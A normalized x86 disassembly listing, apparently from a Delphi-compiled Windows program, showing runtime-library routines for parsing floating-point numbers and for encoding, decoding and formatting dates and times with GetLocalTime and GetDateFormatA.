fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40943b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409446
neg edx
mov ecx esi
call sub_409446
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40943b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409462
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ce4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409446
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409462
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409498
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408e84
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404010
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4094c8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408e84
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404010
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409514
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043e0
mov edx esp
xor ecx ecx
call sub_409384
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409540
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043e0
mov edx esp
xor ecx ecx
call sub_409384
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409588
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4095cc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40963c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4095cc
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407c44
sub_40967c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409588
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407c28
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407c28
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407c28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4096d8
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409714
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4096d8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4097dc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409714
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407c44
sub_40980c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409588
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407c28
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407c28
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407c28
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4096d8
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409958
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_40980c
pop esi
pop ecx
pop ebp
retn 0x8
sub_409978
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_40980c
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_40967c
pop ebx
pop ebp
retn 0x8
sub_4099b8
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_4097dc
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_40963c
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_40963c
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409a28
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409588
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409a50
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_4097dc
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_40963c
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409aa0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_40296c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_40293c
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_40293c
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409af4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x4 ]
push [ ebx ]
lea eax [ ebp - 0x8 ]
call sub_409aa0
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409b3c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028d8
sub_409b80
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4041e0
mov edx eax
mov eax ebx
call sub_409b3c
pop ecx
pop ebx
pop ebp
retn
sub_409ba0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408974
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409b3c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409bec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409c18
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409958
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409c50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40967c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409c90
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409dde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f20
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409de5
lea eax [ ebp - 0x118 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404190
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4041e0
mov edx eax
mov eax [ ebx ]
call sub_40c254
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c3c8
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404440
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c364
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404118
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c3c8
mov ecx eax
mov eax ebx
mov edx esi
call sub_404010
sub_409df8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409ed6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f20
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409edd
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404190
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4041e0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404440
sub_409f00
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a681
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a688
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f44
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c448
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c428
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409b3c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c448
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409b3c
pop ecx
mov al [ eax + lookup_table_409fe3 ]
jmp [ eax * 4 + jump_table_40a01c ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c18
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409c90
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409b80
pop ecx
jmp r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409df8
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409b80
pop ecx
jmp r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c18
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409bec
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c50
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c50
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c50
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409bec
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409bec
pop ecx
push ebp
call sub_409c50
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409c50
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4087e4
test eax eax
jne r-xdata
push ebp
call sub_409bec
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
push ebp
call sub_409c50
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409ba0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409ba0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409c18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4087e4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409b3c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409b3c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409b3c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409a28
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4087e4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409b3c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409b3c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409a28
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c448
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4087e4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409b3c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409ba0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4087e4
test eax eax
